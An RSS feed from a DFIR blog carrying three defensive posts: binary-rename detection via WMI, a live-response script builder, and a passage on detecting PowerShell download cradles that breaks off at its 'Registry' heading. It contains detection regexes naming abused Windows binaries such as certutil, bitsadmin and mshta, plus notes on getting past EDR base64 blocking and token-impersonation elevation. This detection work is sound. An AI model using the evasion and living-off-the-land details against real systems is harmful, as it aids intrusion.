<?xml version="1.0" encoding="UTF-8"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>Matt's DFIR Blog</title>
    <description>A blog for DFIR thoughts, research and for my future reference</description>
    <link>https://mgreen27.github.io/</link>
    <atom:link href="https://mgreen27.github.io/sitemap.xml" rel="self" type="application/rss+xml"/>
    <pubDate>Mon, 13 May 2019 11:52:15 +1000</pubDate>
    <lastBuildDate>Mon, 13 May 2019 11:52:15 +1000</lastBuildDate>
    <generator>Jekyll v3.7.4</generator>
    
      <item>
        <title>Blue Team Hacks - Binary Rename</title>
        <description>&lt;p&gt;In this post I thought I would share an interesting proof of concept I developed to detect Binary Rename of commonly abused binaries. Im going to describe the detection, its limitations and share the code.&lt;/p&gt;

&lt;div style=&quot;text-align: center; font-size:70%;&quot;&gt;&lt;img width=&quot;400&quot; src=&quot;/static/img/article_images/2019-05-12-BinaryRename/00title.jpg&quot; /&gt;&lt;/div&gt;

&lt;h1 id=&quot;background&quot;&gt;Background&lt;/h1&gt;
&lt;p&gt;Binary rename is a defence evasion technique used to bypass brittle process name and path based detections. Following the mantra of misdirection and hiding in plain sight, binary rename is a sub technique of &lt;a href=&quot;https://attack.mitre.org/techniques/T1036/&quot;&gt;T1036&lt;/a&gt; - Masquerading in the Mitre ATT&amp;amp;CK framework.  Binary rename can be observed in use across all stages of the attack lifecycle and is a technique used by a large selection of actors from commodity malware crews through to Nation States. One of the most well recognised use of the binary rename technique was NotPetya, a renamed psexec binary enabling the automated and devastating lateral infection.&lt;/p&gt;

&lt;p&gt;In my current $dayjob I developed a query to hunt for this activity by reviewing an executed process’ binary attributes and comparing with unexpected process names and paths. These have been some of my goto hunt queries pulling in hits for javascript based junkware, through to lateral movement, exfiltration tools and nation state level defence evasion.&lt;/p&gt;

&lt;p&gt;For attacks sitting earlier in the attack lifecycle, often this involves an extension to the living off the land techniques copying a monitored binary to a less conspicuous path. For interactive attacks or attacks later in lifecycle, often an attacker will leverage a hack tool or administration binary not native to the environment but similarly “legitimate” looking to an unfamiliar eye. Understanding the types of binaries used, the PE attributes enables some interesting detection anchors and subsequent hunts.&lt;/p&gt;

&lt;div style=&quot;text-align: center; font-size:70%;&quot;&gt;&lt;img width=&quot;700&quot; src=&quot;/static/img/article_images/2019-05-12-BinaryRename/01vba.png&quot; /&gt;&lt;br /&gt;VBA Macro example: https://twitter.com/ItsReallyNick/status/945682763486777345&lt;/div&gt;

&lt;p&gt;With that in mind, not all security teams have a capable EDR solution (End Point Detection and Response) that enables binary attribute visibility at scale. Thinking about this problem led me to thinking about an open source solution available on a wide selection of machines.&lt;/p&gt;

&lt;h1 id=&quot;solution&quot;&gt;Solution&lt;/h1&gt;
&lt;p&gt;In absence of a mature logging or EDR, an interesting visability tool is WMI Eventing. A WMI event subscription is a method of subscribing to certain system events with a trigger (filter) and action (event consumer). WMI eventing can be used to action on almost any operating system event. For example - logon, process, registry or file activity.&lt;/p&gt;

&lt;div style=&quot;text-align: center; font-size:70%;&quot;&gt;&lt;img width=&quot;500&quot; src=&quot;/static/img/article_images/2019-05-12-BinaryRename/01WMIOverview.png&quot; /&gt;&lt;br /&gt;WMI Eventing&lt;/div&gt;

&lt;p&gt;WMI is the Blue Team’s equivalent to “living off the land” providing telemetry. This telemetry is similar to a limited version of modern EDR userland event tracing without the need to install a service or execute a binary directly. WMI Eventing is not new, Fireeye discussed the use of WMI as an endpoint intrusion detection system back in 2016. I have previously built WMI Eventing based solutions for a variety of niche IR use cases and visibility gaps. Although a complete description of WMI and WMI Event Consumers is outside the scope of this post, please see the further reading section for some detailed links and background in this space.
&lt;br /&gt;&lt;br /&gt;&lt;/p&gt;

&lt;div style=&quot;text-align: center; font-size:70%;&quot;&gt;&lt;img width=&quot;400&quot; src=&quot;/static/img/article_images/2019-05-12-BinaryRename/02filter.png&quot; /&gt;&lt;br /&gt;WMI Filter Query&lt;/div&gt;
&lt;p&gt;&lt;br /&gt;&lt;br /&gt;
An ActiveScript Event Consumers allows the Blue Team to add logic and enrichment to WMI event triggers through the powerful Windows Scripting Host. In this POC I leverage a real time “extrinsic” wmi trigger for process execution monitoring, collecting ProcessID from all executed processes. A query of Win32_Process enables further process metadata to enable lookup of PE Attributes for detection. The PE Attribute in this use case is Original Name, with the Detection to lookup and alert against a list of high priority Original Names
&lt;br /&gt;&lt;br /&gt;&lt;/p&gt;
&lt;div style=&quot;text-align: center; font-size:70%;&quot;&gt;&lt;img width=&quot;500&quot; src=&quot;/static/img/article_images/2019-05-12-BinaryRename/03binaries.png&quot; /&gt;&lt;br /&gt;Binaries targetted: Original Name&lt;/div&gt;
&lt;p&gt;&lt;br /&gt;&lt;br /&gt;
On condition match the POC has the capability to write to the Application event log. Event ID 4, with relevant alert details. The decision to leave out a hash calculation was decided for performance reasons, process path and Original Name providing a lead for live response.&lt;/p&gt;

&lt;div style=&quot;text-align: center; font-size:70%;&quot;&gt;&lt;img width=&quot;500&quot; src=&quot;/static/img/article_images/2019-05-12-BinaryRename/04evtx.png&quot; /&gt;&lt;br /&gt;Generated EventLog&lt;/div&gt;
&lt;p&gt;&lt;br /&gt;&lt;br /&gt;
Similarly, output to a logfile for data ingestion. It is worthy to note: the POC can easily be modifed to suit requirements, removing the write to file or event log functions and function calls.&lt;/p&gt;

&lt;div style=&quot;text-align: center; font-size:70%;&quot;&gt;&lt;img width=&quot;500&quot; src=&quot;/static/img/article_images/2019-05-12-BinaryRename/04log.png&quot; /&gt;&lt;br /&gt;Generated Log File&lt;/div&gt;
&lt;p&gt;&lt;br /&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h1 id=&quot;limitations&quot;&gt;Limitations&lt;/h1&gt;
&lt;p&gt;One of the limitations of leveraging WMI Eventing as an event source is events typically do not hold all the appropriate data for a mature detection use case. To enrich the detection, we require to query the Win32_Process class. There is a slight delay in obtaining process metadata so very short-lived processes (fraction of a second) may cause missed results. In my testing, these very short-lived commands like renamed cmd: &lt;code class=&quot;highlighter-rouge&quot;&gt;cdm /c echo &amp;lt;string&amp;gt;&lt;/code&gt; failed to generate wmi data however a slight pause during a local ping recorded the event. For the use case of a download cradle, access shell or other interactive commands typically of interest I do not foresee an issue but please keep this limitation in mind.&lt;/p&gt;

&lt;p&gt;A second limitation is performance. Although not particularly resource intensive in my testing (no visible resource utilisation), in production there may be unexpected constraints. I have filtered my Process Events with this in mind but testing is recommended. I have also specifically kept the binary attribute matching use case very simple with a eye on performance. This may mean less fidelity in alerting, however the POC is fairly simple to modify and add capabilities.&lt;/p&gt;

&lt;p&gt;It is also worthy to note: in some environments there may be legitimate binary rename activity for some of the targeted Original Names. Some of the binaries listed may require some tweaking of the matching logic to match host environment detection tolerance.&lt;/p&gt;

&lt;p&gt;Finally management, WMI Event consumers are notoriously hard to manage. I have included a Powershell installation script with uninstall instructions to support Powershell 2.0 and above.
&lt;br /&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h1 id=&quot;final-thoughts&quot;&gt;Final Thoughts&lt;/h1&gt;
&lt;p&gt;This has been a fun short project working on an open source detection capability. I was pleasantly surprised when I discovered vbscript has the ability query PE attributes. I hope others may find it useful, feel free to reach out if you have any feedback, questions, or improvements.&lt;/p&gt;

&lt;p&gt;The POC template can be found here - &lt;a href=&quot;https://gist.github.com/mgreen27/80d2709c01ef795206670605c1073370&quot;&gt;WMIEvent-BinaryRename.ps1&lt;/a&gt;
&lt;br /&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h1 id=&quot;further-reading&quot;&gt;Further reading&lt;/h1&gt;
&lt;p&gt;1) Ballenthin,William. Graeber, Matt. Teodorescu Claudiu. &lt;a href=&quot;https://www.fireeye.com/blog/threat-research/2016/08/wmi_vs_wmi_monitor.html&quot;&gt;Windows Management Instrumentation (WMI) Offense, Defense, and Forensics&lt;/a&gt;, 2015 &lt;br /&gt;
2) Green, Matthew. &lt;a href=&quot;https://mgreen27.github.io/posts/2017/04/03/Blue_Team_Hacks-WMI_Eventing.html&quot;&gt;Blue Team Hacks - WMI Eventing&lt;/a&gt;, 2017 &lt;br /&gt;
3) The MITRE Corporation. &lt;a href=&quot;https://attack.mitre.org/techniques/T1036/&quot;&gt;Technique: Masquerading - MITRE ATT&amp;amp;CK™ - &lt;/a&gt; &lt;br /&gt;
4) MSDN. &lt;a href=&quot;https://docs.microsoft.com/en-us/previous-versions/windows/desktop/krnlprov/win32-processstarttrace&quot;&gt;Win32_ProcessStartTrace class&lt;/a&gt; &lt;br /&gt;
5) MSDN. &lt;a href=&quot;https://docs.microsoft.com/en-us/windows/desktop/properties/props-system-originalfilename&quot;&gt;System.OriginalFileName&lt;/a&gt; &lt;br /&gt;
6) Parisi, Timothy. Pena, Evan. &lt;a href=&quot;https://www.fireeye.com/blog/threat-research/2016/08/wmi_vs_wmi_monitor.html&quot;&gt;WMI vs. WMI: Monitoring for Malicious Activity&lt;/a&gt;, 2016 &lt;br /&gt;&lt;/p&gt;

</description>
        <pubDate>Sun, 12 May 2019 00:00:00 +1000</pubDate>
        <link>https://mgreen27.github.io/posts/2019/05/12/BinaryRename.html</link>
        <guid isPermaLink="true">https://mgreen27.github.io/posts/2019/05/12/BinaryRename.html</guid>
        
        <category>DFIR</category>
        
        <category>WMI</category>
        
        <category>EDR</category>
        
        <category>T1036</category>
        
        <category>&quot;Defence</category>
        
        <category>Evasion&quot;</category>
        
        
        <category>posts</category>
        
      </item>
    
      <item>
        <title>Live Response Script Builder</title>
        <description>&lt;div style=&quot;text-align: center;&quot;&gt;&lt;img src=&quot;/static/img/article_images/2019-04-07-ILRScriptBuilder/00title.jpg&quot; width=&quot;500&quot; /&gt;&lt;br /&gt;&lt;/div&gt;

&lt;p&gt;In this post I thought I would share some practical new features implemented in a recent refactor of Invoke-LiveResponse. These features enable fast and modular generation of live response scripts compatible with legacy Powershell. Im going to walk through the background then some of the new features and script creation.&lt;/p&gt;

&lt;h1 id=&quot;background&quot;&gt;Background&lt;/h1&gt;
&lt;p&gt;Invoke-LiveResponse (I-LR) is a Powershell module I put together 18 months ago to enable raw disk collections over WinRM. Leveraging Powerforensics via a custom Powershell function it enabled collections of key forensic artefacts and stdout of script results typical for live response tasks. More information can be found at the wiki, from my previous post or the code.&lt;/p&gt;

&lt;p&gt;Unless your running a preinstalled agent based solution, an important component of live response is local execution. As WinRM is not going to be deployed in most environments a common usecase may be via system management tools, scripting or local USB based collection. Secondly, simple expandability and the ability to write new collection capabilities quickly is an important design factor. I-LR’s supportability on Powershell 2.0 and no additional requirements beyond base operating system makes it a good candidate for this task.&lt;/p&gt;

&lt;p&gt;With that in mind, im going to explain some of the features below and walk through how custom live response scripts can be generated.
&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h1 id=&quot;modular&quot;&gt;Modular&lt;/h1&gt;
&lt;p&gt;Invoke-LiveResponse leverages a new modular component for running collections. We still have the standard preconfigured collection options however a new “-custom” switch allows for dropping a scriptblock or multiple scriptblocks into the custom folder for ForensicCopy mode execution and script generation.&lt;/p&gt;

&lt;div style=&quot;text-align: center; font-size:70%;&quot;&gt;&lt;img src=&quot;/static/img/article_images/2019-04-07-ILRScriptBuilder/01CustomFolder.png&quot; /&gt;Scripts dropped into custom folder.&lt;/div&gt;

&lt;div style=&quot;text-align: center; font-size:70%&quot;&gt;&lt;img width=&quot;400&quot; src=&quot;/static/img/article_images/2019-04-07-ILRScriptBuilder/01CustomAll.png&quot; /&gt;&lt;br /&gt;Invoke-LiveResponse: -all -vss -custom with four custom collections.&lt;/div&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h4 id=&quot;copy-preparation-and-search&quot;&gt;Copy Preparation and Search&lt;/h4&gt;
&lt;p&gt;Under the hood, Invoke-LiveResponse now leverages a copy preparation function to simplify creating collection content. A function: Copy-LiveResponse checks for existence of items and builds a hash table of files and folders using Get-ChildItem. This enables generic glob searching on path and filtering using both Get-ChildItem or Powershell’s powerful “Where-Object” syntax. Depending on mode: Windows API via Copy-Item, or a raw copy via Invoke-ForensicCopy, copies files with fallback to the alternate method if failure.&lt;/p&gt;

&lt;p&gt;Availible switches are familiar to anyone who uses Powershell Get-ChildItem:&lt;/p&gt;

&lt;div style=&quot;text-align: center; font-size:70%&quot;&gt;&lt;img width=&quot;600&quot; src=&quot;/static/img/article_images/2019-04-07-ILRScriptBuilder/02copyswitches.png&quot; /&gt;&lt;br /&gt;Copy-LiveResponse: configuration options.&lt;/div&gt;

&lt;div style=&quot;text-align: center; font-size:70%&quot;&gt;&lt;img width=&quot;650&quot; src=&quot;/static/img/article_images/2019-04-07-ILRScriptBuilder/02execution.png&quot; /&gt;&lt;br /&gt;Example collection: Evidence of Execution.&lt;/div&gt;

&lt;div style=&quot;text-align: center; font-size:70%&quot;&gt;&lt;img width=&quot;700&quot; src=&quot;/static/img/article_images/2019-04-07-ILRScriptBuilder/02forensicmode.png&quot; /&gt;&lt;br /&gt;Example raw collection: Event Logs.&lt;/div&gt;

&lt;p&gt;Its worthy to note: Copy-LiveResponse leverages the Windows API for search. For basic live response of known files this was decided as the best approach as speed is improved greatly. Permissions searching with this technique does not inhibit results as the script runs as SYSTEM and “Get- ChildItem -Force” typically has complete visibility of even protected files. For NTFS special files or raw disk based search, direct use of Invoke- ForensicCopy is required.
For reference, I have included an example below:&lt;/p&gt;

&lt;div style=&quot;text-align: center; font-size:70%&quot;&gt;&lt;img width=&quot;650&quot; src=&quot;/static/img/article_images/2019-04-07-ILRScriptBuilder/02rawexample.png&quot; /&gt;&lt;br /&gt;Example collection: NTFS special files.&lt;/div&gt;

&lt;p&gt;WriteScriptBlock and LocalOut
WriteScriptBlock writes a .ps1 file containing the Invoke-LiveResponse scriptblock to the current working directory. This is useful for creating a script that will be manually run on a host without WinRM configured or troubleshooting development efforts.&lt;/p&gt;

&lt;div style=&quot;text-align: center; font-size:70%&quot;&gt;&lt;img width=&quot;500&quot; src=&quot;/static/img/article_images/2019-04-07-ILRScriptBuilder/03writescriptblock.png&quot; /&gt;&lt;br /&gt;Invoke-LiveResponse -writescriptblock switch writes script to working folder.&lt;/div&gt;

&lt;p&gt;Writescriptblock also writes a scriptblock to allow for local LiveResponse and Memory collection mode. For LiveResponse mode, additional scripts with desired standard-out can be placed into a Content folder in the same location as the script to run on execution. Simlilarly the “-Mem” switch will look for a WinPMem binary in the same folder path as the generated script.&lt;/p&gt;

&lt;div style=&quot;text-align: center; font-size:70%&quot;&gt;&lt;img width=&quot;400&quot; src=&quot;/static/img/article_images/2019-04-07-ILRScriptBuilder/03writescriptblock1.png&quot; /&gt;&lt;br /&gt;Invoke-LiveResponse -writescriptblock folder structure for local execution.&lt;/div&gt;

&lt;p&gt;Combined with “-LocalOut:$True” enables building a ps1 file to run from LiveResponse USB or tool with execution. The results and collected artefacts are copied to the path of the script on execution.&lt;/p&gt;

&lt;div style=&quot;text-align: center; font-size:70%&quot;&gt;&lt;img width=&quot;500&quot; src=&quot;/static/img/article_images/2019-04-07-ILRScriptBuilder/03writescriptblock2.png&quot; /&gt;&lt;br /&gt;Invoke-LiveResponse -writescriptblock -localout:$true for local out to script location on execution.&lt;/div&gt;

&lt;p&gt;Alternatively a localout or UNC path can be defined. Note: UNC path will map a drive to copy, specifying localout will only use preexisting mappings or write to local drives (which is potentially forensically destructive).
&lt;br /&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h4 id=&quot;volume-shadowcopy&quot;&gt;Volume ShadowCopy&lt;/h4&gt;
&lt;p&gt;The “-VSS” switch enables collection of Volume ShadowCopy Service artefacts for all selected collections. The feature invokes CreateSymbolicLink via PInvoke to minimise forensic footprint, mounting all available VSC then copying artefacts if available. A dedup feature will take a hash of the VSS item and compare it to hashable collected files, skipping if previously copied.
&lt;br /&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h4 id=&quot;nobase64&quot;&gt;NoBase64&lt;/h4&gt;
&lt;p&gt;For raw disk access I-LR will utilise reflection to load an embedded Powerforensics module to memory. In field, some EDR / Powershell prevention tools will block the conversion function from base64. The “-Nobase64” switch leverages a direct byte array and GzipStream to bypass this technique. It is worthy to note, the created script is slightly larger size than its base64 equivalent.
&lt;br /&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h4 id=&quot;psreflect&quot;&gt;PSReflect&lt;/h4&gt;
&lt;p&gt;One of the components I have started rolling into Invoke-LiveResponse is reflection via pinvoke and Matt Graeber’s &lt;a href=&quot;https://www.powershellmagazine.com/2014/09/25/easily-defining-enums-structs-and-win32-functions-in-memory/&quot;&gt;PSreflect template&lt;/a&gt;. Initial implementations have been mounting UNC destination, Volume Shadow Copy and SYSTEM elevation via token impersonation. The longer term plan is to eventually run a significant LiveResponse capability via reflection for both forensic collection and live response summary information for use cases Powershell doesn’t provide legacy capability.
&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h1 id=&quot;putting-it-all-together&quot;&gt;Putting it all together&lt;/h1&gt;
&lt;p&gt;After walking through the availible features, I thought I would walk through a script generation for a custom collection.&lt;/p&gt;

&lt;p&gt;For installation please &lt;a href=&quot;https://github.com/mgreen27/Invoke-LiveResponse/archive/master.zip&quot;&gt;download Invoke-LiveResponse&lt;/a&gt; and add to your Powershell profile. Detailed instructions can be found on the &lt;a href=&quot;https://github.com/mgreen27/Invoke-LiveResponse/wiki/Installation&quot;&gt;wiki&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;To import the module:&lt;br /&gt;
&lt;code class=&quot;highlighter-rouge&quot;&gt;PS&amp;gt; Import-Module Invoke-LiveResponse&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;To view help:&lt;br /&gt;
&lt;code class=&quot;highlighter-rouge&quot;&gt;PS&amp;gt; Get-Help Invoke-LiveResponse -detailed&lt;/code&gt;
 &lt;br /&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h4 id=&quot;memory-and-custom-disk&quot;&gt;Memory and custom disk&lt;/h4&gt;
&lt;p&gt;In this usecase I will be collecting memory artefacts. I am interested in collecting a memory dump in addition to memory artefacts on the file system.&lt;/p&gt;

&lt;p&gt;For Memory dump simple use of the inbuilt “-Mem” switch after ensuring WinPMem is available. For the FileSystem memory artefacts, I need to create a custom collection scriptblock.
Firstly, I am interested in pagefile and swapfile collection targeting the root folder (line 6). I have chosen forensic mode as I know these files are typically locked and require special access to download.&lt;/p&gt;

&lt;div style=&quot;text-align: center; font-size:70%&quot;&gt;&lt;img width=&quot;500&quot; src=&quot;/static/img/article_images/2019-04-07-ILRScriptBuilder/06scriptblock.png&quot; /&gt;&lt;br /&gt;Custom Scrtipblock: sbMemoryDisk.ps1&lt;/div&gt;
&lt;p&gt;Secondly, I am interested in any *.dmp files on the filesystem (line 7). For this search I have also targeted the root folder but have also added the “-recurse” switch. This will enable the recursive search to find any dump files on the filesystem by filename. I will also use the “-VSS” switch to mount and search Volume ShadowCopy. It is worthy to note if your looking for a traditional forensic carve / pattern match this is not the method for you - this is a fairly intensive search and typically during a live response we would aim to be more targeted.&lt;/p&gt;

&lt;div style=&quot;text-align: center; font-size:70%&quot;&gt;&lt;img width=&quot;750&quot; src=&quot;/static/img/article_images/2019-04-07-ILRScriptBuilder/06setup.png&quot; /&gt;&lt;br /&gt;Custom Scrtipblock: add to custom folder and run Invoke-LiveResponse.&lt;/div&gt;

&lt;p&gt;Next, add the custom scriptblock into the Invoke-LiveResponse module folder, load and then execute Invoke-LiveResponse. The Command line is:
&lt;code class=&quot;highlighter-rouge&quot;&gt;PS&amp;gt; Invoke-LiveResponse -mem -custom -vss -WriteScriptblock -LocalOut:$True&lt;/code&gt;&lt;br /&gt;
This command will output the generated live response script, to which we need to add a copy of WinPMem to the root of the target location. In my case, this was a removable SSD drive mounted as E:.&lt;/p&gt;

&lt;div style=&quot;text-align: center; font-size:70%&quot;&gt;&lt;img width=&quot;600&quot; src=&quot;/static/img/article_images/2019-04-07-ILRScriptBuilder/06execution.png&quot; /&gt;&lt;br /&gt;Invoke-LiveResponse: Local Execution from USB.&lt;/div&gt;

&lt;p&gt;On script execution, memory is collected and several files are found on the filesystem. As seen in the screenshot below, several process dumps were located on my desktop, the VSS and recyclebin.&lt;/p&gt;

&lt;div style=&quot;text-align: center; font-size:70%&quot;&gt;&lt;img src=&quot;/static/img/article_images/2019-04-07-ILRScriptBuilder/06results.png&quot; /&gt;&lt;br /&gt;Memory Artefacts: Results&lt;/div&gt;
&lt;p&gt;&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h1 id=&quot;final-thoughts&quot;&gt;Final Thoughts&lt;/h1&gt;
&lt;p&gt;I have learnt a lot implementing some of these features in a tool that has been fairly handy to have available in the time I have been using it. There are many ways to run live response and collect data, Invoke-LiveResponse provides a solution with minimal requirements beyond what is available by default from Windows 7 and above. I hope others can get some value using it so please feel free to reach out and provide feedback and improvements.
&lt;br /&gt;&lt;br /&gt;&lt;/p&gt;

</description>
        <pubDate>Sun, 07 Apr 2019 00:00:00 +1100</pubDate>
        <link>https://mgreen27.github.io/posts/2019/04/07/ILRScriptBuilder.html</link>
        <guid isPermaLink="true">https://mgreen27.github.io/posts/2019/04/07/ILRScriptBuilder.html</guid>
        
        <category>DFIR</category>
        
        <category>Powershell</category>
        
        <category>&quot;Live</category>
        
        <category>Response&quot;</category>
        
        
        <category>posts</category>
        
      </item>
    
      <item>
        <title>Powershell Download Cradles</title>
        <description>&lt;div style=&quot;text-align: center;&quot;&gt;&lt;img src=&quot;/static/img/article_images/2018-04-02-DownloadCradle/wolfandsheep2.png&quot; width=&quot;500&quot; /&gt;&lt;/div&gt;

&lt;p&gt;In this post I thought I would share some information on Powershell download cradles I put together recently. I’m going to provide an overview, highlighting areas I found interesting thinking about detection from both network and endpoint views.&lt;/p&gt;

&lt;p&gt;I have also included a link to a results summary and a noisemaker script I have been using to test. I focused on Powershell download cradles, or more specifically cradles that I could execute a Powershell payload. I have also not included all the .NET methods that seem to be effectively the same as Powershell WebClient. &lt;br /&gt;&lt;/p&gt;

&lt;h1 id=&quot;so-what-is-a-cradle-and-why-do-i-care&quot;&gt;So what is a cradle and why do I care?&lt;/h1&gt;
&lt;p&gt;A download cradle is a single line command for download and code execution. Typically seen at the end of a maldoc or exploit, implementing the second stage download of exploit/infection within the attack lifecycle. A download cradle can also be part of a persistence mechanism, tooling or execution at other attack stages when an attacker attempts to download capability or run fileless.&lt;/p&gt;

&lt;p&gt;From an evil standpoint - the best download cradles are proxy, credential and https aware so will slide right by a corporate firewall.
For defenders, obtaining visibility and focusing detection at a common attack chokepoint, we can minimize impact effectively.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/static/img/article_images/2018-04-02-DownloadCradle/Powershell_CLI_ALL.png&quot; alt=&quot;There is a large menu of evil download cradles - a selection with un-obfuscated CommandLine&quot; /&gt;&lt;/p&gt;

&lt;h1 id=&quot;network-detection&quot;&gt;Network Detection&lt;/h1&gt;
&lt;p&gt;Network is usually the easiest point of visibility but can be noisy looking at unfiltered events. I have found interesting use cases baselining current activity then spotting deviations from normal filtering on User-Agent, content, http method, destination domain and URL.&lt;/p&gt;

&lt;p&gt;Understanding the traffic behavior for each cradle and whitelisting trusted components is a good start on building out detection.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/static/img/article_images/2018-04-02-DownloadCradle/CradleSummary.jpg&quot; alt=&quot;Download Cradle summary table&quot; /&gt;&lt;/p&gt;

&lt;h1 id=&quot;endpoint-detection&quot;&gt;Endpoint Detection&lt;/h1&gt;
&lt;p&gt;Endpoint visibility enables the lions share of quality detection opportunities and bypasses network encryption limitations. I see several main visibility areas that highlight the benefit of modern endpoint capability in addition to network monitoring.&lt;/p&gt;

&lt;h3 id=&quot;process-image-chains&quot;&gt;Process Image Chains&lt;/h3&gt;
&lt;p&gt;One of the most well-known methods for spotting evil is parent / child process relationships. A shell, script interpreter or loader as a child to a commonly exploited program may indicate some type of evil leading to the use of a download cradle.&lt;br /&gt;
&lt;br /&gt;
Some examples:&lt;br /&gt;
&lt;small&gt;Parent: &lt;code&gt;(?i).*\\(winword|excel|powerpnt|mspub|visio|outlook)\.exe&lt;/code&gt;&lt;small&gt;&lt;/small&gt;&lt;br /&gt;
&lt;small&gt;Child: &lt;code&gt;(?i).*\\(cmd|powershell|cscript|wscript|wmic|regsvr32|schtasks|rundll32|mshta|hh)\.exe&lt;/code&gt;&lt;small&gt;&lt;/small&gt;&lt;br /&gt;&lt;/small&gt;&lt;/small&gt;&lt;/p&gt;

&lt;p&gt;Similarly WmiPrvSE, a shell or script interpreter as parent may indicate a process chain of &lt;br /&gt;cradle execution.&lt;br /&gt;
&lt;br /&gt;
Some examples:&lt;br /&gt;
&lt;small&gt;Parent: &lt;code&gt;(?i).*\\(mshta|powershell|cmd|rundll32|cscript|wscript|wmiprvse.exe)\.exe&lt;/code&gt;&lt;small&gt;&lt;/small&gt;&lt;br /&gt;
&lt;small&gt;Child: &lt;code&gt;(?i).*\\(cmd|powershell|schtasks|reg|nslookup|certutil|bitsadmin)\.exe&lt;/code&gt;&lt;small&gt;&lt;/small&gt;&lt;br /&gt;&lt;/small&gt;&lt;/small&gt;&lt;/p&gt;

&lt;p&gt;Some of these process relationships may be legitimate in a large environment so appropriate baselining is recommended. A mature blue team understands expected process image and chain mappings to spot deviation from normal. A mature team is also able to spot new and unusual process paths across multigenerational chains.&lt;/p&gt;

&lt;div style=&quot;text-align: center;&quot;&gt;&lt;img src=&quot;/static/img/article_images/2018-04-02-DownloadCradle/Powershell_chain.png&quot; alt=&quot; Process chain from a cradle triggered by opening a maldoc&quot; width=&quot;500&quot; /&gt;&lt;/div&gt;

&lt;h3 id=&quot;command-line&quot;&gt;Command Line&lt;/h3&gt;
&lt;p&gt;Considering process command line makes the blue team’s job much easier by adding another whitelistable data point to the process chain stack.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/static/img/article_images/2018-04-02-DownloadCradle/Powershell_CLI.png&quot; alt=&quot; DDE attack (top) and WMI based macro (bottom)&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Some of the gaps to this method as a standalone technique is command line obfuscation. Obfuscation is an extreamly large area and to give coverage justice, I have included a link in my references below to some excellent research by Daniel Bohannon (Invoke-CradleCrafter was a huge influence on some of the types of cradles I tested).&lt;/p&gt;

&lt;div style=&quot;text-align: center;&quot;&gt;&lt;img src=&quot;/static/img/article_images/2018-04-02-DownloadCradle/Powershell_CLI_03.png&quot; width=&quot;500&quot; alt=&quot;This download cradle was generated by Daniel Bohannon's excellent obfuscation toolsets.&quot; /&gt;&lt;/div&gt;

&lt;p&gt;From a defenders standpoint, obfuscation can defeat specific command line detection, however itself is an indicator. Understanding process chains and their command line enables defenders to whitelist known good and spot abnormalities.&amp;lt;/p&amp;gt;&lt;/p&gt;

&lt;p&gt;Its also worthy to note, depending on the obfuscation type - enabling latest Powershell version 5.x script block logging and Windows10 Anti-Malware Scan Interface equipped tools can assist detection of obfuscated Powershell payloads at runtime.&lt;/p&gt;

&lt;h3 id=&quot;module-loads&quot;&gt;Module loads&lt;/h3&gt;
&lt;p&gt;Module loads provide another unique visibility point vital for modern endpoint based detection. For an attacker living off the land it is impossible for a download cradle to operate without network based modules. Below you can see an example of Powershell loaded network modules during execution.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/static/img/article_images/2018-04-02-DownloadCradle/Powershell_module.png&quot; alt=&quot; Powershell Webclient network module loads&quot; /&gt;
Some good examples I picked out of my dataset are:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Powershell.exe loading rasman.dll and rasapi32.dll (Powershell network methods)&lt;/li&gt;
  &lt;li&gt;Powershell.exe loading ieproxy.dll (Powershell IE COM methods)&lt;/li&gt;
  &lt;li&gt;Powershell.exe loading dnsapi.dll or winhttp.dll or wininet.dll (Common network modules)&lt;/li&gt;
  &lt;li&gt;Powershell.exe loading msxml3.dll (Powershell MsXml COM)&lt;/li&gt;
  &lt;li&gt;Powershell.exe loading qmgrprxy.dll or Microsoft.BackgroundIntelligentTransfer.Management.Interop.dll (Powershell BITS)&lt;/li&gt;
  &lt;li&gt;Certutil.exe loading wininet.dll&lt;/li&gt;
  &lt;li&gt;regsvr32.exe loading scrobj.dll and wininet.dll (Squiblydoo)&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Keep in mind, the list above is focused on Powershell cradles. I have seen downloaders implemented for COM objects from vbscript and other languages so it may be worth also considering module loads more heuristically - e.g common script interpreters. Module visibility is key.&lt;/p&gt;

&lt;h3 id=&quot;network-connections&quot;&gt;Network connections&lt;/h3&gt;
&lt;p&gt;Network connections from the endpoints view provides additional context to detect bad. A mature blue team can collect and baseline network connections by process and user context. In most environments, powershell.exe (and others) would be unexpected connecting to the internet on a standard user endpoint.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/static/img/article_images/2018-04-02-DownloadCradle/Powershell_network.png&quot; alt=&quot;Network activity by process - importance of endpoint context&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;file-write-events&quot;&gt;File write events&lt;/h3&gt;
&lt;p&gt;Despite most Powershell download cradles in my list above being classed as memory resident, there are some that write payloads and artefacts. In the example below of particular interest in the Internet Explorer and Office COM object methods are the cached and *.url link files for downloaded file.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/static/img/article_images/2018-04-02-DownloadCradle/Powershell_file.png&quot; alt=&quot;A selection of Powershell Office COM object file writes - url files are link files that will provide path and file downloaded&quot; /&gt;
Monitoring for unusual file writes by Powershell and certutil.exe are other simple techniques enabled by visibility that can be used to detect download cradle activity.&lt;/p&gt;

&lt;h3 id=&quot;registry&quot;&gt;Registry&lt;/h3&gt;
